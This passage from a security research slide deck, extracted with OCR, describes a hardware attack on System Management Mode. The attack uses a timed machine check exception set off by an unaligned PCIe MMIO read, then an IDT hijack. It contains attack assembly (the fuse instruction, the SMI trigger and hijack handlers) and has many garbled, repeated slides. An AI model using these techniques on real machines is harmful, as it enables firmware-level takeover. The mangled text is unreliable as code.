@ 4 8 c 10 14 18 tc 2
ec0c0000 -
ec0c8000 - | 1700
ec0d0000 -
ec0d8000 - pe
ec0e0000 -
20028000 —_ 1500
ec0£0000 - = 1400
ec0£8000 -
, as
@ 4 8 c 10 14 18 tc 20
ee£40000 -
ef 48000 -
eef50000 - ij 2588)
ccf5800- ——— = =
ecf60000 - = - 1600
ee £68000 -
ec£70000 - Leng
ee£78000 -
ecf800007 1 1 te tt
@ 4 8 c 10 14 18 tc 2
£60000 -
£60800 - | 2000
£61000 -
£61800 - | 1800
£62000 -
2£628000 - pe
£63000 - =
£63600 = = 7 4400
£64000 +
```

## Slide 168

- ⊷Not all MMIO reads are created equal

   - ⊸ Normal devices on PCIe bus: ~700 cycles

   - ⊸ Slowest devices on PCIe bus: ~4000 cycles

- ⊷ Can we increase this?

   - ⊸ Add competing MMIO traffic: +2000 cycles

   - ⊸ Low power states and underclocking: +1400 cycles

   - ⊸ Complex physical PCI topology: +1000 cycles

- ⊷Still not enough, and attack is increasingly impractical

building a fuse

## Slide 169

⊷ “MMIO Configuration Coding Requirements”

“

Instructions used to read MMIO configuration space are required to take the following form:

mov eax/ax/al, any_address_mode;

No other source/target registers may be used other than eax/ax/al.

”

building a fuse

## Slide 170

||||m|ovl (0xf80|13c00),|%eax|||||||
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|||||eax|||||||||
|a1|82|9f|1c
13|92
5e|e7
98|56|9f|af|b3|67|8b|f1|
|f8013bf0|||f8013c00||f8013c04||||f8013c08||||
||||a|ccess time:|~4000c|ycles|||||||

# building a fuse

## Slide 171

||||m|ovq (0xf8013c00)|, %rax|||||||
|---|---|---|---|---|---|---|---|---|---|---|---|
|||||rax||||||||
|a1|82|9f|1c
13|92
5e
e7
98|56|9f|af|b3|67|8b|f1|
|f8013bf0|||f8013c00|f8013c04||||f8013c08||||
||||a|ccess time: ~8000c|ycles|||||||

building a fuse

## Slide 172

⊷ “MMIO Configuration Coding Requirements”

“

In addition, all such accesses are required not to cross any naturally aligned DW boundary.

Access to MMIO configuration space registers that do not meet these requirements result in undefined behavior.

”

building a fuse

## Slide 173

movq (0xf8013c00), %rax rax a1 82 9f 1c 13 92 5e e7 98 56 9f af b3 67 8b f1

building a fuse

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
movgq (Oxf8013c00), %rax
Prax
f1
b3 | 67 | 8b
af
1c | 13} 92} Se} e7 | 98} 56 | Sf
al | 82} Of
B0°9E TOSs
VOIE TOSS
OOVE TOSS
OJFE TOBs
building a fuse
```

## Slide 174

movq (0xf8013c01), %rax

rax

|a1|82|9f|1c
13|92
5e
e7
98|56
9f|af|b3|67|8b|f1|
|---|---|---|---|---|---|---|---|---|---|---|
|f8013bf0|||f8013c00|f8013c04|||f8013c08||||
||||a|ccess time: ~12,000|cycles||||||

# building a fuse

## Slide 175

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax

rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 176

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 177

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 178

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax

rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 179

- ⊷The fuse instruction

   - ⊸ An unaligned 8-byte PCIe access

   - ⊸ Straddles slow PCIe device and non-existing device

   - ⊸ CPU performs 3 separate 4 byte MMIO access

   - ⊸ Final 4-byte MMIO access hits non-existing PCIe device

   - ⊸ No device claims PCI request, results in PCI master-abort

   - ⊸ PCI master-abort received by northbridge

   - ⊸ Northbridge sends error to CPU

   - ⊸ CPU generates machine check exception

   - ⊸ 10,000+ cycles after fuse instruction began

# lighting the fuse

## Slide 180

⊷Little control over how long the fuse instruction takes

- ⊷But MCE must arrive in precise window

# lighting the fuse

## Slide 181

Thread 1 (attacker) Thread 0 (victim) begin ??? instruction out b2 (trigger SMI) receive SMI out b2 ends 10,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … … 100 cycles receive MCE Attack window … … reload IDT

## Slide 182

Thread 1 (attacker) Thread 0 (victim)
begin ??? instruction
10,000 cycles
100 cycles

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Thread 1 (attacker) Thread O [victim]
begin ??°? instruction
10,000 cycles
100 cycles
```

## Slide 183

Thread 1 (attacker) Thread 0 (victim)
begin ??? instruction
10,000 cycles
100 cycles

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Thread 1 (attacker) Thread O {victim)
begin °°? instruction
10,000 cycles
cycles X
100 cycles
```

## Slide 184

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction

⊷What we wanted…

out b2 (trigger SMI) receive SMI out b2 ends ~10,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce generate MCE … Attack window receive MCE … reload IDT

## Slide 185

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction out b2 (trigger SMI) receive SMI out b2 ends ~12,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … ⊷What we have… Attack window … … reload IDT generate MCE receive MCE

## Slide 186

- ⊷This won’t work

   - ⊸ If the MCE is received after SMM reloads the IDT, exception will be handled on SMM’s interrupt handler, not attacker’s

- ⊷Solution:

   - ⊸ Slide the SMI trigger to calibrate the MCE to fall within the attack window

lighting the fuse

## Slide 187

###### Thread 1 (attacker)

Thread 0 (victim)

begin fuse instruction

out b2 (trigger SMI) receive SMI out b2 ends ~12,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … Attack window … … reload IDT generate MCE receive MCE

~12,000 cycles

## Slide 188

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction

out b2 (trigger SMI) ~12,000 cycles receive SMI out b2 ends enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … Attack window … … generate MCE reload IDT receive MCE

~12,000 cycles

## Slide 189

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction ~12,000 cycles out b2 (trigger SMI) receive SMI out b2 ends enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … generate MCE … Attack window receive MCE reload IDT

## Slide 190

- ⊷A targeted disruptor tool

   - ⊸ Previous MCE tool could generate MCE from attacking thread, and deliver to victim thread, but without any control of timing

⊸ Modify tool to light MCE fuse, and sliding delay on the victim thread

⊸ Can deliver cross-core MCEs to victim threads

during privilege transitions or secure modes, at precise target times

lighting the fuse

## Slide 191

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse… We have all the pieces.

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
| et’s build a hammer...
| ets add a handle...
| et’s find a nail...
| et’s light a fuse...
We have all the pieces.
| et’s be a bit more careful...
```

## Slide 192

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse… We have all the pieces. We need a name…

## Slide 193

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse… We have all the pieces. We need a name…

mchammer

## Slide 194

the exploit.

## Slide 195

I/O
Device

North CPU Bridge PCIe device

RAM

MMIO RAM

## Slide 196

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
...
mov eax, 0x668
mov cl, 0
I/O  RAM
cmp cl, 0
Device je 3f
bts eax, 12
mov cr4, rax
sub esp, 8
sgdt [rsp]
mov eax, [rsp + 2]
add esp, 8
mov dl, 0x89
...
North
CPU mov rbx, cr0 SMRAM
Bridge or ebx, 0x80010023
mov cr0, rbx
retf
mov rax, 0
MMIO
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
mov ax, [rbx+DSC_DS]
mov ds, eax
PCIe
mov ax, [rbx+DSC_OT]
mov es, eax
device
...
mov rcx, rbx
mov rax, SmiRendezvous RAM
call rax
add   rsp, 0x20
fxrstor64 [rsp]
...
rsm

## Slide 197

I/O
Device

North CPU Bridge PCIe device

RAM
SMRAM
MMIO
RAM

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
I/O
Device
North
Bridge
CPU
PCle
device
RAM
L A SMRAM
MMIO
RAM
```

## Slide 198

I/O
Device
North
CPU
Bridge
PCIe
device

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
RAM
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
SMRAM
MMIO
RAM
OS IDT

## Slide 199

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
OS IDT

## Slide 200

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
OS IDT

## Slide 201

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 202

… ffffffffc0b2ed80 ffffffffc0b2edc0 thread 0 (victim) ffffffffc0b2ee40 movq $0x92, %%rcx … I/O RAM loop . Device push %%rax outb %%al, $0xb2 push %%rdi nop push %%rsi call os_mce_handler pop %%rsi pop %%rdi pop %%rax iretq North CPU SMRAM Bridge … MMIO ffffffffc0197da0 thread 1 (attacker) … PCIe (reconfigure northbridge) device (install hijack IDT) push %%rax push %%rdi push %%rsi movq (0xf8013ff9), %rax RAM call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 203

… ffffffffc0b2ed80 ffffffffc0b2edc0 thread 0 (victim) ffffffffc0b2ee40 movq $0x92, %%rcx … I/O RAM loop . Device push %%rax outb %%al, $0xb2 push %%rdi nop push %%rsi call os_mce_handler pop %%rsi pop %%rdi pop %%rax iretq North CPU SMRAM Bridge … MMIO ffffffffc0197da0 thread 1 (attacker) … PCIe (reconfigure northbridge) device (install hijack IDT) push %%rax push %%rdi push %%rsi movq (0xf8013ff9), %rax RAM call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 204

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 205

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 206

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 207

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 208

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 209

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 210

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 211

thread 0 (victim)
movq $0x92, %%rcx
I/O
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
RAM
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
SMRAM
…
MMIO ffffffffc0197da0
…
push %%rax
push %%rdi
push %%rsi
RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 212

thread 0 (victim)
movq $0x92, %%rcx
I/O
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
RAM
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
SMRAM
…
MMIO ffffffffc0197da0
…
push %%rax
push %%rdi
push %%rsi
RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 213

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT

## Slide 214

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 215

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 216

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 217

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 218

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 219

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 220

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 221

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 222

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 223

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 224

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
